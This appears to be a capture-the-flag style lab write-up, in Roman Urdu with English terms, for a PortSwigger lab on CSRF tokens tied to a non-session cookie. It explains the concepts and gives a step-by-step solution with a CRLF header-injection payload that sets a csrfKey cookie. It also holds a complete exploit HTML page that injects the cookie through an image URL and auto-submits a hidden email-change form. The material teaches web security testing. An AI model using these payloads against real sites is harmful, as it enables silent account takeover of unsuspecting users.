# 🧪 Lab: CSRF where token is tied to non-session cookie

## 🔰 Lab Ka Maqsad:

Victim ka email change karna via CSRF, jab ke CSRF protection lagi hui hai — lekin poorly implemented hai. Is lab mein hum exploit karenge ek cookie injection bug ko, jahan CSRF token session se linked nahi hai.

---

## 🔍 Core Concepts Jo Lab Mein Use Hue:

### 1. **Session Cookie (ID Card)**

* Jab user login karta hai, server usay ek `session` cookie deta hai.
* Har request mein yeh cookie jati hai taake server pehchaan sake ke yeh kaun user hai.
* Example:

  ```http
  Cookie: session=abc123
  ```
* **Real life analogy:** Tu bank gaya, ID card diya, ab tu andar jaa sakta hai.

---

### 2. **CSRF Token (Visible Stamp on Form)**

* Yeh token har sensitive form (jaise email/password change) ke sath hota hai.
* Server isay check karta hai ke request asli user se aa rahi hai ya nahi.
* Example:

  ```html
  <input type="hidden" name="csrf" value="xyz456">
  ```
* **Real life analogy:** Form pe safety stamp lagta hai, warna bank form reject karega.

---

### 3. **CSRFKey Cookie (Invisible Stamp)**

* Kuch websites csrf token ko ek cookie ke zariye bhi store karti hain — `csrfKey`
* Jab form submit hota hai, server **form ke token** aur **cookie ke csrfKey** ko match karta hai.
* Example:

  ```http
  Cookie: csrfKey=xyz456
  ```
* **Note:** Har website csrfKey nahi use karti, lekin kuch frameworks kartay hain (Angular, Django, etc.)

---

## ⚠️ Vulnerability Ka Root:

### ❌ Poor Implementation:

* CSRF token aur csrfKey ka **koi relation session se nahi hai**
* Matlab agar tu kisi victim ke browser mein **apna csrfKey daal de**, aur wahi token use kare form mein — to request accept ho jaati hai

### 🔁 Token Reuse:

* CSRF token har session ke sath unique hona chahiye, lekin yahan reuse ho raha hai
* Session change karne par bhi server token accept kar raha hai (badi security flaw)

---

## 🚀 Lab Solving Ka Step-by-Step Tareeqa:

### ✅ Step 1: Login as wiener

* Burp browser se `wiener:peter` se login karo
* Profile se email change karo (e.g. `a@x.com`)
* Burp Proxy mein us request ko intercept karo
* Copy karo:

  * `csrf` token (form field se)
  * `csrfKey` (cookie se)

### ✅ Step 2: Repeater Test

* Repeater mein request bhejo
* `session` cookie badlo → logout ho jata hai (expected)
* `csrfKey` ya `csrf` badlo → "Invalid CSRF token" aata hai
* **Matlab:** token valid hona chahiye, lekin session se tied nahi hai (yahi bug hai)

### ✅ Step 3: Victim Account se Confirm karo (Carlos)

* Incognito browser mein login karo as `carlos:montoya`
* Email update karo
* Burp mein request bhejo
* Ab `wiener` wala csrf token + csrfKey ismein use karo
* Agar accept ho gaya → vulnerability confirmed

### ✅ Step 4: Reflected Cookie Injection Test

* `/?search=test` URL open karo
* Dekho response headers mein kya `Set-Cookie` aa raha hai?
* Try karo:

  ```
  ```

/?search=test%0d%0aSet-Cookie:%20csrfKey=XYZ

````
- Agar cookie inject ho gayi → boom, cookie injection possible

---

## 💣 Exploit HTML Ka Breakdown (Jo Exploit Server Pe Host Hoga)

```html
<html>
<body>
  <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@evil.com">
    <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
  </form>

  <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_TOKEN%3b%20SameSite=None"
       onerror="document.forms[0].submit()">
</body>
</html>
````

### 🔍 Har Part Ka Matlab:

* `<form>`: Yeh wo form hai jo victim ke browser mein background mein submit hoga
* `<input name=csrf>`: Yeh wo CSRF token hai jo form ke sath bhejna hai
* `img src=...`: Yeh image intentionally load nahi hoti (kyunke yeh malformed hai)
* `Set-Cookie` inject karta hai → victim ke browser mein csrfKey set ho jati hai
* `SameSite=None`: Browser ko allow karta hai ke dusri site se cookie set ho jaye
* `onerror`: Jab image fail hoti hai, JavaScript form ko auto-submit kar deta hai

---

## 🎭 Victim Ko Fool Kaise Banaya?

* Usko ek innocent page dikhaya jisme kuch image load ho rahi thi
* Image actually cookie injection kar rahi thi (`csrfKey`)
* Us image ke fail hone pe background mein form submit ho gaya
* Us form mein **attacker ka email + attacker ka csrf token** tha
* Server ne verify kiya → token match hua (kyunke wo attacker ka token tha)
* Email update ho gayi — bina victim ko pata chale

---

## 🧠 Penetration Testing Lessons:

### 💡 Jab bhi CSRF test karo:

* Dekho form mein hidden token hai?
* Dekho koi `csrfKey` type ki cookie to nahi?
* Dekho token har login ke sath change hota hai ya same rehta hai?
* Dekho reflected input headers mein inject to nahi ho raha?

### 💥 Agar session se tied nahi hai:

* Token kisi bhi session mein kaam karega → CSRF possible
* Especially agar cookie injection bhi possible hai

### 🛠️ Frameworks jahan aise flaws milte hain:

* Poorly configured Django apps
* Old PHP apps
* Custom made frameworks without token-session mapping

---

## ✅ Final Summary:

* Yeh lab ek **cookie injection + CSRF** combo tha
* Server sirf token check kar raha tha — lekin wo kis session ka hai, yeh nahi dekh raha tha
* Humne image ke zariye cookie inject ki
* Form auto-submit karwaya
* Victim ka email silently change kar diya

---
